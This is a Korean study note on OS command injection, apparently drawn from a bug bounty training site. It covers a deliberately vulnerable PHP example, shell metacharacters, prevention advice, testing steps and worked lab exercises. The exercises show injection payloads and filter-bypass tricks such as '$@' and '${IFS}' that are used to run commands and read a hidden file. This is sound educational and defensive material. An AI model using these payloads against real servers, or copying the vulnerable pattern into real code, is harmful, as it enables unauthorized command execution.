# OS Command Injection

개인 공부용으로 참고하기 위해서 버그바운티 클럽의 Pentest Gym에서 퍼온 사진과 글을 참고하여 정리한 문서입니다. 

| 출처 : https://www.bugbountyclub.com/pentestgym/view/58

# OS Command Injection 이란?
OS 명령 인젝션은 웹 애플리케이션이 구동 중인 서버의 운영체제 상 임의의 명령어를 실행하도록 하는 웹 취약점이다. 웹 애플리케이션은 HTML폼, HTTP 헤더, 쿠키, GET 파라미터 등을 통해 사용자로부터 데이터를 입력받아 시스템 셀에 제공할 수 있다. 이때 사용자가 제공하는 입력값에 대한 유효성 검증이 구현되지 않았거나 안전하지 않은 방식으로 검증을 한다면 OS 명령 인젝션 공격에 취약할 수 있다.
OS 명령 인젝션을 통해 실행되는 명령은 루트나 관리자 권한의 계정이 아닌 웹 애플리케이션을 구동하는 권한으로 명령이 실행되므로 일반적으로 시스템 전체에 손상을 입히지는 못하지만 공격자가 권한 상승이나 다른 취약점과 연계할 수 있다면 더 많은 권한을 획득 할 수 있고, 취약한 웹 애플리케이션을 장악하거나 모든 데이터를 손상시킬 수 있다.

# OS 명령 인젝션은 어떻게 동작할까?
웹 애플리에이션상에 구현된 일부 기능은 운영체제 및 파일시스템과 통신하기 위해 운영체제 명령을 실행 시키기도한다. 이와 같은 구현을 위해 PHP,Java,Python 등
대부분의 개발 언어들은 쉘과 연동되는 내장함수를 제공한다. 이러한 내장 함수는 일반적으로 `system()`,`exec()`와 같은 함수이며, 쉘 함수 라고 부르기도 한다. 이러한 쉘 함수를 이용해 운영체제 명령을 전달하고 실행 결과를 얻을 수 있다. 하지만 간과하지 말아야할 점은 쉘 함수를 사용한다는 것만으로 OS 명령 인젝션에 취약한 것은 아니다. OS 명령 인젝션은 쉘 함수를 통해 시스템 쉘로 전달되는 명령에 사용자로부터 전달받은 입력값이 포함될 때 발생한다. OS 명령 인젝션이 정상적으로 수행되기 위해서 다음과 같은 조건이 충족 되어야한다.
1. 시스템 쉘로 전달되는 명령에 사용자로부터 입력받은 데이터를 포함해야한다.
2. 사용자 데이터는 이스케이프 또는 삭제 처리 없이 정상적인 쉘 명령어로 인식되어야한다.
3. 웹 애플리케이션을 구동중인 계정에 시스템 명령어를 실행 할 수 있는 권한이 있어야한다.

예시로, 리눅스 환경에서 호스팅되고 있는 다음 PHP 코드를 살표본다
```bash
<?php
echo "<p>filename 매개변수(GET)를 이용하여 조회할 파일의 이름을 입력하세요</p>";
$file = $_GET['filename'];
system("cat $file");
?>
```
위 소스코드는 `filename`이라는 GET 파라미터의 값을 cat 명령의 인자로 사용하고 `system()`함수를 통해 명령을 실행시키고 있다. 그렇다면 `filename` 파라미터에 정상적인 데이터가 입력된다면 이 소스코드는 개발자가 의도한대로 지정된 파일의 내용을 보여주는 동작을 하게 되는 것이다.
아래와 같은 `hello.html`이라는 파일이 서버상에 존재한다고 가정
```bash
<h2>Hello, Bug bounty club!</h2>
```
파일을 웹 브라우저를 통해 다음과 같이 응답이 표시될 것이다.
![](https://www.bugbountyclub.com/uploads/images/training/1637820543.png)
사용자가 입력한 `hello.html`이라는 데이터는 웹 애플리케이션 내부에서 아래의 과정을 거쳐 시스템 명령에 포함되게 된다.
![](https://www.bugbountyclub.com/uploads/images/training/1638317925.png)

소스코드를 통해 `filename`이라는 GET 파라미터를 직접 조작이 가능한데, 정상적인 파일 이름이 아닌 어떤 다른 데이터로 변환이 얼마든지 가능하다는 뜻이다. OS 명령 인젝션을 수행하기 위해서 사용되는 특수문자들이 있는데 아래의 표에 있는 특수문자들은 쉘 인터프리터에서 어떤 특정한 기능을 수행하는 메타문자들이며, 웹 애플리케이션에서 이러한 문자들에 대해 안전한 필터링이 구현되지 않다면 공격자는 메타문자를 이용해 기존 명령 구문에 임의의 명령을 주입하고 실행 시킬 수 있게 된다. 흔히 많이 사용하는 것들만 표에서 표시한다.

`cmd1&&cmd2` : cmd1을 성공적으로 실행하면 cmd2 실행
`cmd1||cmd2` : cmd1을 실패해도 cmd2는 실행
`cmd1;cmd2` : cmd1 명령의 실행이 끝나면 cmd2가 실행된다 (리눅스/유닉스 전용)
`$(cmd)` : $() 안의 명령의 실행한 결과를 반환한다. (리눅스/유닉스 전용)


`/ex.php?filename=hello.html` 뒤에 세미콜론(;)과 id 명령어를 추가하여 요청했을때 일어나는 결과
```bash
http://www.example.com/ex.php?filename=hello.html;id
```
![](https://www.bugbountyclub.com/uploads/images/training/1638317962.png)
세미콜론에 의해 두개의 명령어로 구분되고 순차적으로 실행되게 된다.
![](https://www.bugbountyclub.com/uploads/images/training/1638251096.png)
이 방법을 통해서 wget이나 웹쉘과 같은 다른 악성 페이로드를 서버에 다운하여 익스플로잇하거나, 리버스쉘을 획득 할 수 있게 된다. 즉 조직 내 다른 시스템으로 공격을 확장할 수도 있다는 뜻이다.

# 유형
## 직접 명령 인젝션 (Direct Command Injection)
사용자가 입력한 데이터가 OS 명령의 인자로 직접 포함되는 경우

## 간접 명령 인젝션 (Indirect Command Injection)
파일이나 환경변수를 통해 웹 애플리케이션의 시스템 쉘로 OS 명령이 전달되는 경우이다. 보통 윈도우 시스템에서 나타나며 `Forfiles`,`pcalua.exe`등과 같이 CMD를 사용하지 않고 명령을 호출할 수 있도록 지원하는 유틸리티를 통해 가능하다

## 블라인드 명령 인젝션 (Blind Command Injection)
사용자 입력 데이터가 웹 서버의 시스템 쉘로 전달되어 실행되지만 기본적인 명령 인젝션과는 달리 명령의 실행 결과가 HTTP 응답 메시지에 출력되지 않는 경우 사용할 수 있는 OS Command Injection의 일종이다.

# OS 명령 인젝션의 예방법
OS 명령 인젝션을 예방하기 위해 가장 좋은 방법은 웹 애플리케이션에서 쉘 함수를 사용하여 명령을 실행하지 않는 것이다. 하지만 부득이하게 사용해야한다면 가급적 사용자가 임의로 조작할 수 있는 입력값이 명령에 직접 포함되지 않도록해야한다. 만일 사용자 입력을 OS 명령에 포함시켜야 한다면, 사용자 입력에 대해서 엄격한 검증을 수행해야한다. 이를 위해 가장 좋은 방법은 화이트리스트 방식으로 허용되는 입력값 목록을 만들고 허용되지 않는 입력값에 대한 필터링을 수행한다.
만일 블랙리스트 기반의 방식을 사용해야 한다면 운영체제 종류에 따라 아래 특수문자들에 대한 이스케이프 처리나 요청을 차단해야한다.

- 윈도우의 경우:  ( ) < > & * ' | = ? ; [ ] ^ ~ ! . ” % @ / \ : + , ` 문자들 앞에 '^'를 추가하여 이스케이프하거나 요청을 차단합니다.
- 리눅스 또는 유닉스의 경우: { } ( ) < > & * ' | = ? ; [ ] $ – # ~ ! . ” % / \ : + , ` 문자들 앞에 '\'를 추가하여 이스케이프하거나 요청을 차단합니다.
 
# 테스트 방법
1. 쉘 명령을 호출하는 기능 식별
웹 애플리케이션의 모든 기능을 사용하면서 쉘 명령을 호출하는 기능을 찾는다. 대표적으로 GET 파라미터 값으로 파일 이름이 사용되는 엔드포인트 등이 있다. 아래는 명령 인젝션 취약점이 존재할 수 있는 일반적인 파라미터들이다.
```bash
cmd
exec
command
execute
ping
query
jump
code
reg
do
func
arg
option
load
process
step
read
function
req
feature
exe
module
payload
run
print
```
GET 파라미터가 아닌 폼 데이터, 쿠키나 HTTP 헤더를 통해서도 쉘 명령으로 데이터가 전달 될 수 있으므로 사용자가 데이터 전달될 수 있는 모든 입력 가능한 소스를 고려해야한다.

2.  OS(운영체제) 식별
OS 명령 인젝션에서 사용되는 페이로드는 웹 애플리케이션에서 구동되고 있는 운영체제 커맨드라인 명령에서 유효하다. 리눅스 계열과 윈도우 계열의 커맨드라인은 유사하면서도 일부 차이가 있으므로 서버의 운영체제를 식별한다면, OS 페이로드를 구성하는데 도움이 된다.

3. 테스트 문자열을 통한 응답 관찰
```bash
abc;echo%20commandi;
```
위 요청에 대한 응답으로 commandi 라는 문자열이 HTTP 응답에 출력된다면 OS Command Injection에 취약하다고 판단 할 수 있다. 사용자의 입력 유효성을 검사하는 방법과 오류를 처리하는 방법에 따라 공격자에게 유용한 응답을 반환하거나 응답을 반환하지 않을 수도 있다.

4. 개념증명(PoC)을 위한 실제 명령 사용
실제 공격에 사용될 수 있는 명령을 사용해 OS Command Injection이 실행되는지 확인한다. ex. `abc;whoami;`

# 실습 문제풀이 
## Exercise 1
| 이 문제는 사용자가 항목을 선택하면 선택된 항목에 해당되는 파일명을 이용해 셸 명령을 실행합니다. 안일한 개발자는 OS 명령 인젝션 공격에 대해 어떠한 보호조치도 구현해놓지 않았습니다. whoami 명령을 실행시켜보세요.

1. submit을 눌러 파일이 어떤 데이터를 가지고 있는지 확인.
```bash
`/commandi_ex1.php?filename=myfile1.html`

File 1
```
2. `filename`의 파라미터 값을 변경하여 확인
```bash
/commandi_ex1.php?filename=myfile1.html;%20whoami;id

File 1
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Exercise 2
| 이 문제는 Exercise 1과 동일합니다만 다른 점이 있다면 개발자가 OS 명령 인젝션 공격에 주로 사용되는 명령어를 제거하여 공격을 방어했다는 점입니다. 방어를 우회하고 whoami 명령을 성공적으로 실행시켜보세요.

1. submit을 눌러 파일이 어떤 데이터를 가지고 있는지 확인.
```bash
`/commandi_ex1.php?filename=myfile1.html`

File 1
```

2. `filename`의 파라미터 값을 변경하여 확인
```bash
/commandi_ex2.php?filename=myfile1.html;whoami

File 1
```

1. 주로 사용되는 명령어를 제거하여 공격에 1차 방어를 한것으로 판단. -> 파라미터 값을 문자열을 우회하여 실행
```bash
/commandi_ex2.php?filename=myfile1.html;who$@ami;i$@d

File 1
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Exercise 3
| 이 문제를 해결하려면 웹 루트 디렉토리 안에 숨겨진 파일을 찾아 해당 파일의 내용을 확인해보세요. 당신은 숨겨진 파일을 찾기 위해 공백(Space) 문자를 사용해야 할 것입니다. 하지만 사용자 입력에 포함된 공백 문자와 공격에 주로 사용되는 명령어들(Exercise 2와 동일한 명령어들임)은 보안 필터에 의해 제거됩니다. 숨겨진 파일을 찾아 파일 내용을 웹 브라우저에 출력하세요.

1. submit을 눌러 파일이 어떤 데이터를 가지고 있는지 확인.
```bash
`/commandi_ex1.php?filename=myfile1.html`

File 1
```

2. 숨겨진 파일을 찾기 위해 공백을 써야하는데, 이를 활용하기 위해 IFS를 사용한다.
```bash
/commandi_ex3.php?filename=myfile1.html;%20l$@s${IFS}-al

File 1
total 52
drwxr-xr-x 3 root root 4096 Feb 21  2022 .
drwxr-xr-x 1 root root 4096 Oct 18  2021 ..
-rw-r--r-- 1 root root   47 Dec  8  2021 .hidden_file.txt
-rw-r--r-- 1 root root  949 Feb 21  2022 commandi_ex1.php
-rw-r--r-- 1 root root 1107 Dec  7  2021 commandi_ex2.php
-rw-r--r-- 1 root root 1289 Feb 21  2022 commandi_ex3.php
drwxr-xr-x 2 root root 4096 Dec  6  2021 css
-rw-r--r-- 1 root root   16 Dec  6  2021 footer.php
-rw-r--r-- 1 root root  897 Dec  6  2021 header.php
-rw-r--r-- 1 root root  754 Feb 21  2022 index.php
-rw-r--r-- 1 root root    7 Dec  7  2021 myfile1.html
-rw-r--r-- 1 root root    7 Dec  7  2021 myfile2.html
-rw-r--r-- 1 root root    7 Dec  7  2021 myfile3.html
``` 

3. 파일이름에는 블랙히스트 대상이 id 문자열이 있기 때문에 $@를 사용하여 우회하여 숨겨진 파일을 읽는다.
```bash
/commandi_ex3.php?filename=.hi$@dden_file.txt

Congratulations! You solved this exercise. :-)
```